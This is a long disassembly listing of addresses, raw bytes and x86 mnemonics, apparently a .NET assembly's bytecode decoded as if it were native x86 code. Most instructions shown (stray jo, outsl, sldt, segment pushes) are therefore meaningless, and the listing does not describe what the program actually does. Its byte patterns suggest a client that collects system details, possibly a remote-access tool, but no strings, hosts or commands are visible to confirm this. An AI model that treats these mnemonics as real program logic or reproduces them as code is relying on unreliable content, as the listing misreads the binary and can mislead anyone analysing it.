  40465f:	57                   	push   %edi
  404660:	01 00                	add    %eax,(%eax)
  404662:	70 28                	jo     0x40468c
  404664:	8d 00                	lea    (%eax),%eax
  404666:	00 06                	add    %al,(%esi)
  404668:	26 72 57             	es jb  0x4046c2
  40466b:	01 00                	add    %eax,(%eax)
  40466d:	70 2a                	jo     0x404699
  40466f:	09 2a                	or     %ebp,(%edx)
  404671:	00 00                	add    %al,(%eax)
  404673:	00 01                	add    %al,(%ecx)
  404675:	10 00                	adc    %al,(%eax)
  404677:	00 00                	add    %al,(%eax)
  404679:	00 0e                	add    %cl,(%esi)
  40467b:	00 32                	add    %dh,(%edx)
  40467d:	40                   	inc    %eax
  40467e:	00 03                	add    %al,(%ebx)
  404680:	0f 00 00             	sldt   (%eax)
  404683:	01 1b                	add    %ebx,(%ebx)
  404685:	30 02                	xor    %al,(%edx)
  404687:	00 6f 00             	add    %ch,0x0(%edi)
  40468a:	00 00                	add    %al,(%eax)
  40468c:	1d 00 00 11 72       	sbb    $0x72110000,%eax
  404691:	5d                   	pop    %ebp
  404692:	04 00                	add    $0x0,%al
  404694:	70 03                	jo     0x404699
  404696:	6f                   	outsl  %ds:(%esi),(%dx)
  404697:	ba 00 00 0a 0b       	mov    $0xb0a0000,%edx
  40469c:	12 01                	adc    (%ecx),%al
  40469e:	28 bb 00 00 0a 28    	sub    %bh,0x280a0000(%ebx)
  4046a4:	51                   	push   %ecx
  4046a5:	00 00                	add    %al,(%eax)
  4046a7:	0a 73 b1             	or     -0x4f(%ebx),%dh
  4046aa:	00 00                	add    %al,(%eax)
  4046ac:	0a 0a                	or     (%edx),%cl
  4046ae:	06                   	push   %es
  4046af:	6f                   	outsl  %ds:(%esi),(%dx)
  4046b0:	b2 00                	mov    $0x0,%dl
  4046b2:	00 0a                	add    %cl,(%edx)
  4046b4:	0c 08                	or     $0x8,%al
  4046b6:	28 01                	sub    %al,(%ecx)
  4046b8:	00 00                	add    %al,(%eax)
  4046ba:	2b 28                	sub    (%eax),%ebp
  4046bc:	02 00                	add    (%eax),%al
  4046be:	00 2b                	add    %ch,(%ebx)
  4046c0:	25 2d 04 26 14       	and    $0x1426042d,%eax
  4046c5:	2b 16                	sub    (%esi),%edx
  4046c7:	72 cf                	jb     0x404698
  4046c9:	04 00                	add    $0x0,%al
  4046cb:	70 28                	jo     0x4046f5
  4046cd:	b5 00                	mov    $0x0,%ch
  4046cf:	00 0a                	add    %cl,(%edx)
  4046d1:	25 2d 04 26 14       	and    $0x1426042d,%eax
  4046d6:	2b 05 6f 38 00 00    	sub    0x386f,%eax
  4046dc:	0a 0d de 1d 08 2c    	or     0x2c081dde,%cl
  4046e2:	06                   	push   %es
  4046e3:	08 6f 33             	or     %ch,0x33(%edi)
  4046e6:	00 00                	add    %al,(%eax)
  4046e8:	0a dc                	or     %ah,%bl
  4046ea:	06                   	push   %es
  4046eb:	2c 06                	sub    $0x6,%al
  4046ed:	06                   	push   %es
  4046ee:	6f                   	outsl  %ds:(%esi),(%dx)
  4046ef:	33 00                	xor    (%eax),%eax
  4046f1:	00 0a                	add    %cl,(%edx)
  4046f3:	dc 26                	fsubl  (%esi)
  4046f5:	de 00                	fiadds (%eax)
  4046f7:	72 01                	jb     0x4046fa
  4046f9:	01 00                	add    %eax,(%eax)
  4046fb:	70 2a                	jo     0x404727
  4046fd:	09 2a                	or     %ebp,(%edx)
  4046ff:	00 01                	add    %al,(%ecx)
  404701:	28 00                	sub    %al,(%eax)
  404703:	00 02                	add    %al,(%edx)
  404705:	00 25 00 2b 50 00    	add    %ah,0x502b00
  40470b:	0a 00                	or     (%eax),%al
  40470d:	00 00                	add    %al,(%eax)
  40470f:	00 02                	add    %al,(%edx)
  404711:	00 1e                	add    %bl,(%esi)
  404713:	00 3c 5a             	add    %bh,(%edx,%ebx,2)
  404716:	00 0a                	add    %cl,(%edx)
	...
  404720:	64 64 00 03          	fs add %al,%fs:(%ebx)
  404724:	0f 00 00             	sldt   (%eax)
  404727:	01 1e                	add    %ebx,(%esi)
  404729:	02 28                	add    (%eax),%ch
  40472b:	1a 00                	sbb    (%eax),%al
  40472d:	00 0a                	add    %cl,(%edx)
  40472f:	2a 1b                	sub    (%ebx),%bl
  404731:	30 04 00             	xor    %al,(%eax,%eax,1)
  404734:	5f                   	pop    %edi
  404735:	00 00                	add    %al,(%eax)
  404737:	00 1e                	add    %bl,(%esi)
  404739:	00 00                	add    %al,(%eax)
  40473b:	11 1b                	adc    %ebx,(%ebx)
  40473d:	8d 0f                	lea    (%edi),%ecx
  40473f:	00 00                	add    %al,(%eax)
  404741:	01 25 16 28 be 00    	add    %esp,0xbe2816
  404747:	00 0a                	add    %cl,(%edx)
  404749:	8c 78 00             	mov    %?,0x0(%eax)
  40474c:	00 01                	add    %al,(%ecx)
  40474e:	a2 25 17 28 bf       	mov    %al,0xbf281725
  404753:	00 00                	add    %al,(%eax)
  404755:	0a a2 25 18 28 c0    	or     -0x3fd7e7db(%edx),%ah
  40475b:	00 00                	add    %al,(%eax)
  40475d:	0a a2 25 19 28 c1    	or     -0x3ed7e6db(%edx),%ah
  404763:	00 00                	add    %al,(%eax)
  404765:	0a a2 25 1a 28 aa    	or     -0x55d7e5db(%edx),%ah
  40476b:	00 00                	add    %al,(%eax)
  40476d:	0a 28                	or     (%eax),%ch
  40476f:	ab                   	stos   %eax,%es:(%edi)
  404770:	00 00                	add    %al,(%eax)
  404772:	0a 73 ac             	or     -0x54(%ebx),%dh
  404775:	00 00                	add    %al,(%eax)
  404777:	0a 28                	or     (%eax),%ch
  404779:	ad                   	lods   %ds:(%esi),%eax
  40477a:	00 00                	add    %al,(%eax)
  40477c:	0a 8c 61 00 00 01 a2 	or     -0x5dff0000(%ecx,%eiz,2),%cl
  404783:	28 c2                	sub    %al,%dl
  404785:	00 00                	add    %al,(%eax)
  404787:	0a 28                	or     (%eax),%ch
  404789:	7f 00                	jg     0x40478b
  40478b:	00 06                	add    %al,(%esi)
  40478d:	0a de                	or     %dh,%bl
  40478f:	09 26                	or     %esp,(%esi)
  404791:	72 e7                	jb     0x40477a
  404793:	04 00                	add    $0x0,%al
  404795:	70 0a                	jo     0x4047a1
  404797:	de 00                	fiadds (%eax)
  404799:	06                   	push   %es
  40479a:	2a 00                	sub    (%eax),%al
  40479c:	01 10                	add    %edx,(%eax)
  40479e:	00 00                	add    %al,(%eax)
  4047a0:	00 00                	add    %al,(%eax)
  4047a2:	00 00                	add    %al,(%eax)
  4047a4:	54                   	push   %esp
  4047a5:	54                   	push   %esp
  4047a6:	00 09                	add    %cl,(%ecx)
  4047a8:	0f 00 00             	sldt   (%eax)
  4047ab:	01 13                	add    %edx,(%ebx)
  4047ad:	30 03                	xor    %al,(%ebx)
  4047af:	00 5a 00             	add    %bl,0x0(%edx)
  4047b2:	00 00                	add    %al,(%eax)
  4047b4:	1f                   	pop    %ds
  4047b5:	00 00                	add    %al,(%eax)
  4047b7:	11 73 c3             	adc    %esi,-0x3d(%ebx)
  4047ba:	00 00                	add    %al,(%eax)
  4047bc:	0a 28                	or     (%eax),%ch
  4047be:	c4 00                	les    (%eax),%eax
  4047c0:	00 0a                	add    %cl,(%edx)
  4047c2:	02 6f 21             	add    0x21(%edi),%ch
  4047c5:	00 00                	add    %al,(%eax)
  4047c7:	0a 0a                	or     (%edx),%cl
  4047c9:	06                   	push   %es
  4047ca:	6f                   	outsl  %ds:(%esi),(%dx)
  4047cb:	c5 00                	lds    (%eax),%eax
  4047cd:	00 0a                	add    %cl,(%edx)
  4047cf:	0a 73 53             	or     0x53(%ebx),%dh
  4047d2:	00 00                	add    %al,(%eax)
  4047d4:	0a 0b                	or     (%ebx),%cl
  4047d6:	06                   	push   %es
  4047d7:	0c 16                	or     $0x16,%al
  4047d9:	0d 2b 1c 08 09       	or     $0x9081c2b,%eax
  4047de:	91                   	xchg   %eax,%ecx
  4047df:	13 04 07             	adc    (%edi,%eax,1),%eax
  4047e2:	12 04 72             	adc    (%edx,%esi,2),%al
  4047e5:	f9                   	stc
  4047e6:	04 00                	add    $0x0,%al
  4047e8:	70 28                	jo     0x404812
  4047ea:	c6 00 00             	movb   $0x0,(%eax)
  4047ed:	0a 6f 55             	or     0x55(%edi),%ch
  4047f0:	00 00                	add    %al,(%eax)
  4047f2:	0a 26                	or     (%esi),%ah
  4047f4:	09 17                	or     %edx,(%edi)
  4047f6:	58                   	pop    %eax
  4047f7:	0d 09 08 8e 69       	or     $0x698e0809,%eax
  4047fc:	32 de                	xor    %dh,%bl
  4047fe:	07                   	pop    %es
  4047ff:	6f                   	outsl  %ds:(%esi),(%dx)
  404800:	38 00                	cmp    %al,(%eax)
  404802:	00 0a                	add    %cl,(%edx)
  404804:	16                   	push   %ss
  404805:	1f                   	pop    %ds
  404806:	14 6f                	adc    $0x6f,%al
  404808:	c7 00 00 0a 6f c8    	movl   $0xc86f0a00,(%eax)
  40480e:	00 00                	add    %al,(%eax)
  404810:	0a 2a                	or     (%edx),%ch
  404812:	00 00                	add    %al,(%eax)
  404814:	13 30                	adc    (%eax),%esi
  404816:	07                   	pop    %es
  404817:	00 b3 01 00 00 20    	add    %dh,0x20000001(%ebx)
  40481d:	00 00                	add    %al,(%eax)
  40481f:	11 73 62             	adc    %esi,0x62(%ebx)
  404822:	00 00                	add    %al,(%eax)
  404824:	06                   	push   %es
  404825:	25 72 21 01 00       	and    $0x12172,%eax
  40482a:	70 6f                	jo     0x40489b
  40482c:	4d                   	dec    %ebp
  40482d:	00 00                	add    %al,(%eax)
  40482f:	06                   	push   %es
  404830:	72 ff                	jb     0x404831
  404832:	04 00                	add    $0x0,%al
  404834:	70 6f                	jo     0x4048a5
  404836:	5a                   	pop    %edx
  404837:	00 00                	add    %al,(%eax)
  404839:	06                   	push   %es
  40483a:	25 72 15 05 00       	and    $0x51572,%eax
  40483f:	70 6f                	jo     0x4048b0
  404841:	4d                   	dec    %ebp
  404842:	00 00                	add    %al,(%eax)
  404844:	06                   	push   %es
  404845:	7e 10                	jle    0x404857
  404847:	00 00                	add    %al,(%eax)
  404849:	04 6f                	add    $0x6f,%al
  40484b:	5a                   	pop    %edx
  40484c:	00 00                	add    %al,(%eax)
  40484e:	06                   	push   %es
  40484f:	25 72 1f 05 00       	and    $0x51f72,%eax
  404854:	70 6f                	jo     0x4048c5
  404856:	4d                   	dec    %ebp
  404857:	00 00                	add    %al,(%eax)
  404859:	06                   	push   %es
  40485a:	28 bf 00 00 0a 6f    	sub    %bh,0x6f0a0000(%edi)
  404860:	38 00                	cmp    %al,(%eax)
  404862:	00 0a                	add    %cl,(%edx)
  404864:	6f                   	outsl  %ds:(%esi),(%dx)
  404865:	5a                   	pop    %edx
  404866:	00 00                	add    %al,(%eax)
  404868:	06                   	push   %es
  404869:	25 72 29 05 00       	and    $0x52972,%eax
  40486e:	70 6f                	jo     0x4048df
  404870:	4d                   	dec    %ebp
  404871:	00 00                	add    %al,(%eax)
  404873:	06                   	push   %es
  404874:	73 ae                	jae    0x404824
  404876:	00 00                	add    %al,(%eax)
  404878:	0a 28                	or     (%eax),%ch
  40487a:	af                   	scas   %es:(%edi),%eax
  40487b:	00 00                	add    %al,(%eax)
  40487d:	0a 6f 38             	or     0x38(%edi),%ch
  404880:	00 00                	add    %al,(%eax)
  404882:	0a 72 2f             	or     0x2f(%edx),%dh
  404885:	05 00 70 14 6f       	add    $0x6f147000,%eax
  40488a:	c9                   	leave
  40488b:	00 00                	add    %al,(%eax)
  40488d:	0a 72 43             	or     0x43(%edx),%dh
  404890:	05 00 70 28 ca       	add    $0xca287000,%eax
  404895:	00 00                	add    %al,(%eax)
  404897:	0a 0a                	or     (%edx),%cl
  404899:	12 00                	adc    (%eax),%al
  40489b:	28 cb                	sub    %cl,%bl
  40489d:	00 00                	add    %al,(%eax)
  40489f:	0a 72 47             	or     0x47(%edx),%dh
  4048a2:	05 00 70 72 51       	add    $0x51727000,%eax
  4048a7:	05 00 70 6f c9       	add    $0xc96f7000,%eax
  4048ac:	00 00                	add    %al,(%eax)
  4048ae:	0a 72 5d             	or     0x5d(%edx),%dh
  4048b1:	05 00 70 72 69       	add    $0x69727000,%eax
  4048b6:	05 00 70 6f c9       	add    $0xc96f7000,%eax
  4048bb:	00 00                	add    %al,(%eax)
  4048bd:	0a 28                	or     (%eax),%ch
  4048bf:	9c                   	pushf
  4048c0:	00 00                	add    %al,(%eax)
  4048c2:	0a 6f 5a             	or     0x5a(%edi),%ch
  4048c5:	00 00                	add    %al,(%eax)
  4048c7:	06                   	push   %es
  4048c8:	25 72 75 05 00       	and    $0x57572,%eax
  4048cd:	70 6f                	jo     0x40493e
  4048cf:	4d                   	dec    %ebp
  4048d0:	00 00                	add    %al,(%eax)
  4048d2:	06                   	push   %es
  4048d3:	28 cc                	sub    %cl,%ah
  4048d5:	00 00                	add    %al,(%eax)
  4048d7:	0a 6f 5a             	or     0x5a(%edi),%ch
  4048da:	00 00                	add    %al,(%eax)
  4048dc:	06                   	push   %es
  4048dd:	25 72 7f 05 00       	and    $0x57f72,%eax
  4048e2:	70 6f                	jo     0x404953
  4048e4:	4d                   	dec    %ebp
  4048e5:	00 00                	add    %al,(%eax)
  4048e7:	06                   	push   %es
  4048e8:	7e 03                	jle    0x4048ed
  4048ea:	00 00                	add    %al,(%eax)
  4048ec:	04 6f                	add    $0x6f,%al
  4048ee:	5a                   	pop    %edx
  4048ef:	00 00                	add    %al,(%eax)
  4048f1:	06                   	push   %es
  4048f2:	25 72 8f 05 00       	and    $0x58f72,%eax
  4048f7:	70 6f                	jo     0x404968
  4048f9:	4d                   	dec    %ebp
  4048fa:	00 00                	add    %al,(%eax)
  4048fc:	06                   	push   %es
  4048fd:	28 81 00 00 06 0a    	sub    %al,0xa060000(%ecx)
  404903:	12 00                	adc    (%eax),%al
  404905:	28 cb                	sub    %cl,%bl
  404907:	00 00                	add    %al,(%eax)
  404909:	0a 6f 5b             	or     0x5b(%edi),%ch
  40490c:	00 00                	add    %al,(%eax)
  40490e:	0a 72 9b             	or     -0x65(%edx),%dh
  404911:	05 00 70 72 8f       	add    $0x8f727000,%eax
  404916:	05 00 70 6f c9       	add    $0xc96f7000,%eax
  40491b:	00 00                	add    %al,(%eax)
  40491d:	0a 72 a5             	or     -0x5b(%edx),%dh
  404920:	05 00 70 72 1f       	add    $0x1f727000,%eax
  404925:	05 00 70 6f c9       	add    $0xc96f7000,%eax
  40492a:	00 00                	add    %al,(%eax)
  40492c:	0a 6f 5a             	or     0x5a(%edi),%ch
  40492f:	00 00                	add    %al,(%eax)
  404931:	06                   	push   %es
  404932:	25 72 b1 05 00       	and    $0x5b172,%eax
  404937:	70 6f                	jo     0x4049a8
  404939:	4d                   	dec    %ebp
  40493a:	00 00                	add    %al,(%eax)
  40493c:	06                   	push   %es
  40493d:	72 49                	jb     0x404988
  40493f:	01 00                	add    %eax,(%eax)
  404941:	70 7e                	jo     0x4049c1
  404943:	10 00                	adc    %al,(%eax)
  404945:	00 04 28             	add    %al,(%eax,%ebp,1)
  404948:	8e 00                	mov    (%eax),%es
  40494a:	00 06                	add    %al,(%esi)
  40494c:	25 2d 06 26 72       	and    $0x7226062d,%eax
  404951:	57                   	push   %edi
  404952:	01 00                	add    %eax,(%eax)
  404954:	70 28                	jo     0x40497e
  404956:	51                   	push   %ecx
  404957:	00 00                	add    %al,(%eax)
  404959:	0a 6f 5a             	or     0x5a(%edi),%ch
  40495c:	00 00                	add    %al,(%eax)
  40495e:	06                   	push   %es
  40495f:	25 72 c9 05 00       	and    $0x5c972,%eax
  404964:	70 6f                	jo     0x4049d5
  404966:	4d                   	dec    %ebp
  404967:	00 00                	add    %al,(%eax)
  404969:	06                   	push   %es
  40496a:	7e 0e                	jle    0x40497a
  40496c:	00 00                	add    %al,(%eax)
  40496e:	04 6f                	add    $0x6f,%al
  404970:	5a                   	pop    %edx
  404971:	00 00                	add    %al,(%eax)
  404973:	06                   	push   %es
  404974:	25 72 db 05 00       	and    $0x5db72,%eax
  404979:	70 6f                	jo     0x4049ea
  40497b:	4d                   	dec    %ebp
  40497c:	00 00                	add    %al,(%eax)
  40497e:	06                   	push   %es
  40497f:	28 83 00 00 06 6f    	sub    %al,0x6f060000(%ebx)
  404985:	5a                   	pop    %edx
  404986:	00 00                	add    %al,(%eax)
  404988:	06                   	push   %es
  404989:	25 72 ef 05 00       	and    $0x5ef72,%eax
  40498e:	70 6f                	jo     0x4049ff
  404990:	4d                   	dec    %ebp
  404991:	00 00                	add    %al,(%eax)
  404993:	06                   	push   %es
  404994:	28 cc                	sub    %cl,%ah
  404996:	00 00                	add    %al,(%eax)
  404998:	0a 73 87             	or     -0x79(%ebx),%dh
  40499b:	00 00                	add    %al,(%eax)
  40499d:	0a 28                	or     (%eax),%ch
  40499f:	cd 00                	int    $0x0
  4049a1:	00 0a                	add    %cl,(%edx)
  4049a3:	0b 12                	or     (%edx),%edx
  4049a5:	01 28                	add    %ebp,(%eax)
  4049a7:	ce                   	into
  4049a8:	00 00                	add    %al,(%eax)
  4049aa:	0a 0b                	or     (%ebx),%cl
  4049ac:	12 01                	adc    (%ecx),%al
  4049ae:	28 cf                	sub    %cl,%bh
  4049b0:	00 00                	add    %al,(%eax)
  4049b2:	0a 6f 5a             	or     0x5a(%edi),%ch
  4049b5:	00 00                	add    %al,(%eax)
  4049b7:	06                   	push   %es
  4049b8:	25 72 03 06 00       	and    $0x60372,%eax
  4049bd:	70 6f                	jo     0x404a2e
  4049bf:	4d                   	dec    %ebp
  4049c0:	00 00                	add    %al,(%eax)
  4049c2:	06                   	push   %es
  4049c3:	72 01                	jb     0x4049c6
  4049c5:	01 00                	add    %eax,(%eax)
  4049c7:	70 6f                	jo     0x404a38
  4049c9:	5a                   	pop    %edx
  4049ca:	00 00                	add    %al,(%eax)
  4049cc:	06                   	push   %es
  4049cd:	6f                   	outsl  %ds:(%esi),(%dx)
  4049ce:	57                   	push   %edi
  4049cf:	00 00                	add    %al,(%eax)
  4049d1:	06                   	push   %es
  4049d2:	2a 56 28             	sub    0x28(%esi),%dl
  4049d5:	d0 00                	rolb   $1,(%eax)
  4049d7:	00 0a                	add    %cl,(%edx)
  4049d9:	73 d1                	jae    0x4049ac
  4049db:	00 00                	add    %al,(%eax)
  4049dd:	0a 20                	or     (%eax),%ah
  4049df:	20 02                	and    %al,(%edx)
  4049e1:	00 00                	add    %al,(%eax)
  4049e3:	6f                   	outsl  %ds:(%esi),(%dx)
  4049e4:	d2 00                	rolb   %cl,(%eax)
  4049e6:	00 0a                	add    %cl,(%edx)
  4049e8:	2a 00                	sub    (%eax),%al
  4049ea:	00 00                	add    %al,(%eax)
  4049ec:	1b 30                	sbb    (%eax),%esi
  4049ee:	02 00                	add    (%eax),%al
  4049f0:	43                   	inc    %ebx
  4049f1:	00 00                	add    %al,(%eax)
  4049f3:	00 00                	add    %al,(%eax)
  4049f5:	00 00                	add    %al,(%eax)
  4049f7:	00 7e 0f             	add    %bh,0xf(%esi)
  4049fa:	00 00                	add    %al,(%eax)
  4049fc:	04 28                	add    $0x28,%al
  4049fe:	17                   	pop    %ss
  4049ff:	00 00                	add    %al,(%eax)
  404a01:	0a 2c 0c             	or     (%esp,%ecx,1),%ch
  404a04:	28 81 00 00 06 2c    	sub    %al,0x2c060000(%ecx)
  404a0a:	05 28 8b 00 00       	add    $0x8b28,%eax
  404a0f:	06                   	push   %es
  404a10:	28 88 00 00 06 28    	sub    %cl,0x28060000(%eax)
  404a16:	08 00                	or     %al,(%eax)
  404a18:	00 06                	add    %al,(%esi)
  404a1a:	25 2d 03 26 2b       	and    $0x2b26032d,%eax
  404a1f:	05 6f 76 00 00       	add    $0x766f,%eax
  404a24:	0a 28                	or     (%eax),%ch
  404a26:	06                   	push   %es
  404a27:	00 00                	add    %al,(%eax)
  404a29:	06                   	push   %es
  404a2a:	25 2d 03 26 2b       	and    $0x2b26032d,%eax
  404a2f:	05 28 d3 00 00       	add    $0xd328,%eax
  404a34:	0a de                	or     %dh,%bl
  404a36:	03 26                	add    (%esi),%esp
  404a38:	de 00                	fiadds (%eax)
  404a3a:	2a 00                	sub    (%eax),%al
  404a3c:	01 10                	add    %edx,(%eax)
  404a3e:	00 00                	add    %al,(%eax)
  404a40:	00 00                	add    %al,(%eax)
  404a42:	00 00                	add    %al,(%eax)
  404a44:	3f                   	aas
  404a45:	3f                   	aas
  404a46:	00 03                	add    %al,(%ebx)
  404a48:	0f 00 00             	sldt   (%eax)
  404a4b:	01 1b                	add    %ebx,(%ebx)
  404a4d:	30 03                	xor    %al,(%ebx)
  404a4f:	00 a0 00 00 00 21    	add    %ah,0x21000000(%eax)
  404a55:	00 00                	add    %al,(%eax)
  404a57:	11 72 0d             	adc    %esi,0xd(%edx)
  404a5a:	06                   	push   %es
  404a5b:	00 70 28             	add    %dh,0x28(%eax)
  404a5e:	c0 00 00             	rolb   $0x0,(%eax)
  404a61:	0a 72 13             	or     0x13(%edx),%dh
  404a64:	06                   	push   %es
  404a65:	00 70 28             	add    %dh,0x28(%eax)
  404a68:	9c                   	pushf
  404a69:	00 00                	add    %al,(%eax)
  404a6b:	0a 72 3f             	or     0x3f(%edx),%dh
  404a6e:	06                   	push   %es
  404a6f:	00 70 73             	add    %dh,0x73(%eax)
  404a72:	d4 00                	aam    $0x0
  404a74:	00 0a                	add    %cl,(%edx)
  404a76:	0a 73 d5             	or     -0x2b(%ebx),%dh
  404a79:	00 00                	add    %al,(%eax)
  404a7b:	0a 0b                	or     (%ebx),%cl
  404a7d:	06                   	push   %es
  404a7e:	6f                   	outsl  %ds:(%esi),(%dx)
  404a7f:	b2 00                	mov    $0x0,%dl
  404a81:	00 0a                	add    %cl,(%edx)
  404a83:	6f                   	outsl  %ds:(%esi),(%dx)
  404a84:	b3 00                	mov    $0x0,%bl
  404a86:	00 0a                	add    %cl,(%edx)
  404a88:	0c 2b                	or     $0x2b,%al
  404a8a:	1d 08 6f b4 00       	sbb    $0xb46f08,%eax
  404a8f:	00 0a                	add    %cl,(%edx)
  404a91:	0d 07 09 72 7d       	or     $0x7d720907,%eax
  404a96:	06                   	push   %es
  404a97:	00 70 6f             	add    %dh,0x6f(%eax)
  404a9a:	b5 00                	mov    $0x0,%ch
  404a9c:	00 0a                	add    %cl,(%edx)
  404a9e:	6f                   	outsl  %ds:(%esi),(%dx)
  404a9f:	38 00                	cmp    %al,(%eax)
  404aa1:	00 0a                	add    %cl,(%edx)
  404aa3:	6f                   	outsl  %ds:(%esi),(%dx)
  404aa4:	d6                   	salc
  404aa5:	00 00                	add    %al,(%eax)
  404aa7:	0a 08                	or     (%eax),%cl
  404aa9:	6f                   	outsl  %ds:(%esi),(%dx)
  404aaa:	b7 00                	mov    $0x0,%bh
  404aac:	00 0a                	add    %cl,(%edx)
  404aae:	2d db de 0a 08       	sub    $0x80adedb,%eax
  404ab3:	2c 06                	sub    $0x6,%al
  404ab5:	08 6f 33             	or     %ch,0x33(%edi)
  404ab8:	00 00                	add    %al,(%eax)
  404aba:	0a dc                	or     %ah,%bl
  404abc:	07                   	pop    %es
  404abd:	6f                   	outsl  %ds:(%esi),(%dx)
  404abe:	d7                   	xlat   %ds:(%ebx)
  404abf:	00 00                	add    %al,(%eax)
  404ac1:	0a 2d 09 72 95 06    	or     0x6957209,%ch
  404ac7:	00 70 13             	add    %dh,0x13(%eax)
  404aca:	04 de                	add    $0xde,%al
  404acc:	28 72 9d             	sub    %dh,-0x63(%edx)
  404acf:	06                   	push   %es
  404ad0:	00 70 07             	add    %dh,0x7(%eax)
  404ad3:	6f                   	outsl  %ds:(%esi),(%dx)
  404ad4:	d8 00                	fadds  (%eax)
  404ad6:	00 0a                	add    %cl,(%edx)
  404ad8:	28 d9                	sub    %bl,%cl
  404ada:	00 00                	add    %al,(%eax)
  404adc:	0a 13                	or     (%ebx),%dl
  404ade:	04 de                	add    $0xde,%al
  404ae0:	14 06                	adc    $0x6,%al
  404ae2:	2c 06                	sub    $0x6,%al
  404ae4:	06                   	push   %es
  404ae5:	6f                   	outsl  %ds:(%esi),(%dx)
  404ae6:	33 00                	xor    (%eax),%eax
  404ae8:	00 0a                	add    %cl,(%edx)
  404aea:	dc 26                	fsubl  (%esi)
  404aec:	72 95                	jb     0x404a83
  404aee:	06                   	push   %es
  404aef:	00 70 13             	add    %dh,0x13(%eax)
  404af2:	04 de                	add    $0xde,%al
  404af4:	00 11                	add    %dl,(%ecx)
  404af6:	04 2a                	add    $0x2a,%al
  404af8:	01 28                	add    %ebp,(%eax)
  404afa:	00 00                	add    %al,(%eax)
  404afc:	02 00                	add    (%eax),%al
  404afe:	31 00                	xor    %eax,(%eax)
  404b00:	29 5a 00             	sub    %ebx,0x0(%edx)
  404b03:	0a 00                	or     (%eax),%al
  404b05:	00 00                	add    %al,(%eax)
  404b07:	00 02                	add    %al,(%edx)
  404b09:	00 1f                	add    %bl,(%edi)
  404b0b:	00 6a 89             	add    %ch,-0x77(%edx)
  404b0e:	00 0a                	add    %cl,(%edx)
	...
  404b18:	93                   	xchg   %eax,%ebx
  404b19:	93                   	xchg   %eax,%ebx
  404b1a:	00 0a                	add    %cl,(%edx)
  404b1c:	0f 00 00             	sldt   (%eax)
  404b1f:	01 13                	add    %edx,(%ebx)
  404b21:	30 02                	xor    %al,(%edx)
  404b23:	00 2f                	add    %ch,(%edi)
  404b25:	00 00                	add    %al,(%eax)
  404b27:	00 22                	add    %ah,(%edx)
  404b29:	00 00                	add    %al,(%eax)
  404b2b:	11 28                	adc    %ebp,(%eax)
  404b2d:	da 00                	fiaddl (%eax)
  404b2f:	00 0a                	add    %cl,(%edx)
  404b31:	0a 16                	or     (%esi),%dl
  404b33:	0b 2b                	or     (%ebx),%ebp
  404b35:	1d 06 07 9a 0c       	sbb    $0xc9a0706,%eax
  404b3a:	08 6f db             	or     %ch,-0x25(%edi)
  404b3d:	00 00                	add    %al,(%eax)
  404b3f:	0a 02                	or     (%edx),%al
  404b41:	6f                   	outsl  %ds:(%esi),(%dx)
  404b42:	dc 00                	faddl  (%eax)
  404b44:	00 0a                	add    %cl,(%edx)
  404b46:	28 dd                	sub    %bl,%ch
  404b48:	00 00                	add    %al,(%eax)
  404b4a:	0a 2c 02             	or     (%edx,%eax,1),%ch
  404b4d:	08 2a                	or     %ch,(%edx)
  404b4f:	07                   	pop    %es
  404b50:	17                   	pop    %ss
  404b51:	58                   	pop    %eax
  404b52:	0b 07                	or     (%edi),%eax
  404b54:	06                   	push   %es
  404b55:	8e 69 32             	mov    0x32(%ecx),%gs
  404b58:	dd 14 2a             	fstl   (%edx,%ebp,1)
  404b5b:	00 1b                	add    %bl,(%ebx)
  404b5d:	30 01                	xor    %al,(%ecx)
  404b5f:	00 11                	add    %dl,(%ecx)
  404b61:	00 00                	add    %al,(%eax)
  404b63:	00 00                	add    %al,(%eax)
  404b65:	00 00                	add    %al,(%eax)
  404b67:	00 20                	add    %ah,(%eax)
  404b69:	03 00                	add    (%eax),%eax
  404b6b:	00 80 28 85 00 00    	add    %al,0x8528(%eax)
  404b71:	06                   	push   %es
  404b72:	26 de 03             	fiadds %es:(%ebx)
  404b75:	26 de 00             	fiadds %es:(%eax)
  404b78:	2a 00                	sub    (%eax),%al
  404b7a:	00 00                	add    %al,(%eax)
  404b7c:	01 10                	add    %edx,(%eax)
  404b7e:	00 00                	add    %al,(%eax)
  404b80:	00 00                	add    %al,(%eax)
  404b82:	00 00                	add    %al,(%eax)
  404b84:	0d 0d 00 03 0f       	or     $0xf03000d,%eax
  404b89:	00 00                	add    %al,(%eax)
  404b8b:	01 13                	add    %edx,(%ebx)
  404b8d:	30 03                	xor    %al,(%ebx)
  404b8f:	00 14 00             	add    %dl,(%eax,%eax,1)
  404b92:	00 00                	add    %al,(%eax)
  404b94:	02 00                	add    (%eax),%al
  404b96:	00 11                	add    %dl,(%ecx)
  404b98:	16                   	push   %ss
  404b99:	7e 08                	jle    0x404ba3
  404b9b:	00 00                	add    %al,(%eax)
  404b9d:	04 12                	add    $0x12,%al
  404b9f:	00 73 de             	add    %dh,-0x22(%ebx)
  404ba2:	00 00                	add    %al,(%eax)
  404ba4:	0a 80 35 00 00 04    	or     0x4000035(%eax),%al
  404baa:	06                   	push   %es
  404bab:	2a 62 7e             	sub    0x7e(%edx),%ah
  404bae:	35 00 00 04 2c       	xor    $0x2c040000,%eax
  404bb3:	10 7e 35             	adc    %bh,0x35(%esi)
  404bb6:	00 00                	add    %al,(%eax)
  404bb8:	04 6f                	add    $0x6f,%al
  404bba:	df 00                	filds  (%eax)
  404bbc:	00 0a                	add    %cl,(%edx)
  404bbe:	14 80                	adc    $0x80,%al
  404bc0:	35 00 00 04 2a       	xor    $0x2a040000,%eax
  404bc5:	66 7e 0f             	data16 jle 0x404bd7
  404bc8:	00 00                	add    %al,(%eax)
  404bca:	04 28                	add    $0x28,%al
  404bcc:	17                   	pop    %ss
  404bcd:	00 00                	add    %al,(%eax)
  404bcf:	0a 2c 0c             	or     (%esp,%ecx,1),%ch
  404bd2:	28 81 00 00 06 2c    	sub    %al,0x2c060000(%ecx)
  404bd8:	05 28 8b 00 00       	add    $0x8b28,%eax
  404bdd:	06                   	push   %es
  404bde:	2a 00                	sub    (%eax),%al
  404be0:	1b 30                	sbb    (%eax),%esi
  404be2:	03 00                	add    (%eax),%eax
  404be4:	24 00                	and    $0x0,%al
  404be6:	00 00                	add    %al,(%eax)
  404be8:	00 00                	add    %al,(%eax)
  404bea:	00 00                	add    %al,(%eax)
  404bec:	14 fe                	adc    $0xfe,%al
  404bee:	06                   	push   %es
  404bef:	89 00                	mov    %eax,(%eax)
  404bf1:	00 06                	add    %al,(%esi)
  404bf3:	73 e0                	jae    0x404bd5
  404bf5:	00 00                	add    %al,(%eax)
